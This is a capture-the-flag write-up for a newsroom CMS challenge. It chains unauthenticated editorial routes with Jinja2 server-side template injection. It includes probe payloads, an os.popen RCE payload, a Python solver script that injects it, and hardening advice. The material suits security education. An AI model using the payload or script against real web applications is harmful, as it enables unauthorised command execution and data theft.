<div align="center">

# Technical Write-Up: CMS Newsroom (Broken Access Control & Jinja2 SSTI to RCE)

</div>

<div align="center">

[![Platform](https://img.shields.io/badge/Platform-InvataCyber.ro-blue.svg?style=flat&logo=target)](#)
[![Category](https://img.shields.io/badge/Category-Web%20%7C%20Server--Side-orange.svg?style=flat&logo=python)](#)
[![Vulnerability](https://img.shields.io/badge/CWE-CWE--1336%20%2F%20CWE--306-red.svg?style=flat)](#)
[![Impact](https://img.shields.io/badge/Impact-Remote%20Code%20Execution%20(RCE)-critical.svg?style=flat)](#)
[![Author](https://img.shields.io/badge/Author-Moan%C4%83%20%C8%98tef%C4%83nu%C8%9B--Cornel-blue.svg?style=flat&logo=github)](https://github.com/stefanutc1)

</div>

---

<div align="center">

## 1. Challenge Specification

</div>

- **Target Application**: Newly migrated newsroom content management system (CMS).
- **Flaw Context**: Single Sign-On (SSO) authentication middleware was erroneously omitted from editorial management routes, allowing unauthenticated visitors to create and edit articles. Article content is evaluated by the server before rendering.
- **Flag Location**: `/flag.txt`
- **Flag Format**: `InvataCyber{...}`

---

<div align="center">

## 2. Attack Surface Analysis & Root Cause

</div>

The challenge presents two chained vulnerabilities:

1. **Broken Access Control ([CWE-306](https://cwe.mitre.org/data/definitions/306.html))**:  
   The editorial routes (`/edit/<id>`, `/new-post`) lack authentication decorators. Any unauthenticated network client can issue HTTP POST requests to modify published articles.
2. **Server-Side Template Injection ([CWE-1336](https://cwe.mitre.org/data/definitions/1336.html))**:  
   The backend improperly utilizes `render_template_string()` in Python Flask/Jinja2, concatenating user-controlled article content directly into the template string rather than passing it as a template context variable.

---

<div align="center">

## 3. Template Engine Fingerprinting

</div>

Submitting mathematical expression payloads into article content via `POST /edit/5`:
- **Initial Probe**: `{{ 7 * 7 }}`  
  Viewing `GET /post/5` rendered:
  ```html
  <div class="post-content">49</div>
  ```
- **String Multiplication Probe**: `{{ 'a' * 3 }}`  
  Rendered output: `aaa`.

This confirmed an active **Jinja2 / Python** templating engine without sandbox isolation.

---

<div align="center">

## 4. Sandbox Escape & Remote Code Execution (RCE)

</div>

In Jinja2 on Python 3, access to underlying Python objects is achievable via the method resolution order (`__mro__`):

1. Access base class:
   ```jinja2
   {{ ''.__class__.__mro__[1] }}
   ```
2. Inspect available subclasses:
   ```jinja2
   {{ ''.__class__.__mro__[1].__subclasses__() }}
   ```
3. Locate `subprocess.Popen` or `os.system` execution primitives to read `/flag.txt`:
   ```jinja2
   {{ cycler.__init__.__globals__.os.popen('cat /flag.txt').read() }}
   ```

---

<div align="center">

## 5. Automated Python Solver (`blog_flag.py`)

</div>

```python
#!/usr/bin/env python3
import requests
import re

TARGET_URL = "http://target.invatacyber.ro/edit/5"
POST_URL = "http://target.invatacyber.ro/post/5"

ssti_payload = "{{ cycler.__init__.__globals__.os.popen('cat /flag.txt').read() }}"

# 1. Update article content with SSTI payload
data = {
    "title": "Breaking News",
    "content": ssti_payload
}
requests.post(TARGET_URL, data=data)

# 2. View article to trigger template execution and retrieve flag
resp = requests.get(POST_URL)
flag = re.search(r"InvataCyber\{.*?\}", resp.text)
if flag:
    print(f"[+] Flag Extracted: {flag.group(0)}")
```

---

<div align="center">

## 6. Remediation & Hardening Recommendations

</div>

1. **Enforce Authentication Middleware**: Apply mandatory SSO/OAuth2-Proxy authentication wrappers across all administrative and editorial routes.
2. **Eliminate `render_template_string`**: Use static templates with explicit context parameter binding:
   ```python
   # SECURE: Pass content as variable, avoiding template code compilation
   return render_template('post.html', content=article.content)
   ```
3. **Sandboxed Template Execution**: If dynamic template rendering is required, utilize Jinja2 `SandboxedEnvironment` to restrict access to dangerous private attributes (`__class__`, `__mro__`, `__globals__`).
